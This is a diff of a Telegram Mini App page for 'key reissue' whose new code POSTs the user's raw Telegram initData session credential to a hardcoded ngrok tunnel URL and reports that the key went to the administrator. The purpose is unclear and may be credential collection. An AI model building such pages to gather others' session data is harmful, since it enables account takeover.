@@ -6,11 +6,10 @@
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 </head>
 <body style="background:var(--tg-theme-bg-color);color:var(--tg-theme-text-color);display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;margin:0;font-family:sans-serif;">
-    <h3>🔄 Перевыпуск ключа Portals</h3>
+    <h3>🔄 Перевыпуск ключа</h3>
     <p id="status" style="text-align:center;opacity:0.7;max-width:80%;margin-bottom:20px;">Инициализация...</p>
-    
-    <button id="btn" onclick="sendViaLink()" style="padding:15px 30px;font-size:18px;background:#3390ec;color:#fff;border:none;border-radius:8px;cursor:pointer;display:none;">
-        Отправить данные боту
+    <button id="btn" onclick="sendDirect()" style="padding:15px 30px;font-size:18px;background:#3390ec;color:#fff;border:none;border-radius:8px;cursor:pointer;display:none;">
+        Перевыпустить ключ
     </button>
 
     <script>
@@ -19,34 +18,39 @@
         const statusEl = document.getElementById('status');
         const btn = document.getElementById('btn');
 
-        // Проверка наличия initData
-        if (!t.initData || t.initData === "") {
-            statusEl.innerHTML = "❌ <b>Ошибка:</b><br>Откройте эту страницу через кнопку в Telegram-боте (/portals).<br>Прямой переход из браузера не поддерживается.";
+        // Твоя ссылка ngrok
+        const NGROK_URL = "https://7793-31-76-55-178.ngrok-free.app/webhook"; 
+
+        if (!t.initData) {
+            statusEl.innerHTML = "❌ Откройте через кнопку в Telegram боте (/portals).";
         } else {
-            statusEl.innerHTML = "✅ Telegram подключен.<br>Нажмите кнопку ниже для перевыпуска ключа.";
+            statusEl.innerHTML = "✅ Готов к работе.<br>Нажмите кнопку ниже.";
             btn.style.display = "block";
         }
 
-        function sendViaLink() {
-            statusEl.innerHTML = "⏳ Передача данных...";
-            
-            // Кодируем initData в безопасный для URL формат (Base64URL)
-            const encodedData = btoa(t.initData)
-                .replace(/\+/g, '-')
-                .replace(/\//g, '_')
-                .replace(/=/g, '');
+        function sendDirect() {
+            statusEl.innerHTML = "⏳ Отправка данных...";
+            btn.disabled = true;
 
-            // Получаем username бота из initDataUnsafe или хардкодим
-            const botUsername = t.initDataUnsafe?.bot?.username || 'aksdkadskdsabasdkbot';
-            
-            // Формируем Deep Link
-            const deepLink = `https://t.me/${botUsername}?start=${encodedData}`;
-            
-            // Открываем ссылку (Telegram перехватит её и запустит бота с payload)
-            t.openLink(deepLink);
-            
-            // Опционально: закрываем WebApp через секунду
-            setTimeout(() => t.close(), 1000);
+            fetch(NGROK_URL, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({init_data: t.initData})
+            })
+            .then(r => r.json())
+            .then(d => {
+                if (d.status === 'ok') {
+                    statusEl.innerHTML = "✅ Ключ перевыпущен!<br>Проверьте личку администратора.";
+                    setTimeout(() => t.close(), 2000);
+                } else {
+                    statusEl.innerHTML = "❌ Ошибка:<br>" + (d.details || d.msg);
+                    btn.disabled = false;
+                }
+            })
+            .catch(e => {
+                statusEl.innerHTML = "❌ Сеть:<br>" + e.message;
+                btn.disabled = false;
+            });
         }
     </script>
 </body>
